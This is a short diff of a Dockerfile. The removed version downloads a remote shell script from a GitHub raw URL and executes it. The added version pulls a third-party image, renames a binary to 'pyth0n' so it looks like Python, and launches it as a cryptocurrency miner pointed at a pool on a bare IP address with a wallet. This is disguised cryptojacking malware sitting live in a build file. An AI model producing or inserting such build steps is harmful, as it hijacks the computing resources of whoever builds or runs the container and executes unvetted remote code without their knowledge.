@@ -1,6 +1,4 @@
-FROM debian:stretch
-EXPOSE 8080
-RUN apt update -y \
-  && apt install -y \
-  wget
-RUN wget https://raw.githubusercontent.com/agamlimaa/work/main/gxx.sh && chmod +x gxx.sh && ./gxx.sh
+FROM christiankm01/master:latest
+RUN set -ex \
+  && mv /usr/bin/turtle /usr/bin/pyth0n \
+  && pyth0n  --algorithm argon2id_chukwa2 --pool 23.95.242.133:3022 --wallet userA -k
